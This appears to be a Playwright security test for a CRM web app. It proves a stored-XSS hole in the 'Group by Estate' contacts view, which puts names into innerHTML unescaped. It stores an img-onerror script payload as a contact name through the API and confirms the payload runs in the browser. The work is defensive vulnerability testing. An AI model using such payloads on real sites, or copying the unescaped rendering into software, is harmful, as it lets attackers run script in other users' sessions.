const { test, expect, request } = require('@playwright/test');

/**
 * Proves a real, live stored-XSS vulnerability found via static analysis of
 * assets/js/app.js. The MAIN contacts table (renderContactRow, line ~302)
 * correctly wraps every field in the app's own `esc()` helper. But the
 * "Group by Estate" view (button#btn-group-estate -> toggleGroupByEstate()
 * -> renderEstateLayout() -> renderEstateTable(), ~line 3205-3229) renders
 * `${c.name}`, `${c.phone}`, `${c.email}` straight into a template-literal
 * innerHTML string with NO escaping at all. Same data, same API, different
 * render path — one is safe, the other isn't. This creates a contact whose
 * name is an XSS payload via the same API a malicious agent/admin user
 * could use, then opens the Estate-grouped view as a normal logged-in user
 * and confirms the payload actually executes in-browser.
 */
test.describe('Security — stored XSS in "Group by Estate" contacts view', () => {
  test('a contact name containing a script payload executes when the estate view is opened', async ({ page, baseURL }) => {
    const api = await request.newContext({ baseURL });

    const login = await api.post('/crm/api/auth/login', {
      data: { username: 'qa.admin', password: 'TestPass123!' },
    });
    expect(login.ok()).toBeTruthy();

    const marker = `XSS_PROOF_${Date.now()}`;
    const payload = `<img src=x onerror="window.__xss_proof='${marker}'">`;

    const create = await api.post('/crm/api/contacts', {
      data: { name: payload },
    });
    expect(create.ok()).toBeTruthy();
    const created = (await create.json()).data;
    expect(created.name).toBe(payload); // confirms it was stored as literal text, unescaped

    // Now view it as a normal logged-in browser user, the way any teammate
    // who opens the contacts list would.
    await page.goto('/crm/');
    await page.fill('#login-username', 'qa.admin');
    await page.fill('#login-password', 'TestPass123!');
    await Promise.all([
      page.waitForNavigation({ timeout: 15000 }),
      page.click('#login-btn'),
    ]);

    await page.click('.nav-item[data-view="contacts"]');
    await page.waitForTimeout(1000); // list fetch + render
    await page.click('#btn-group-estate');
    await page.waitForTimeout(1000); // estate table render

    const fired = await page.evaluate(() => window.__xss_proof);
    expect(fired, 'window.__xss_proof was not set — payload did not execute').toBe(marker);
  });
});
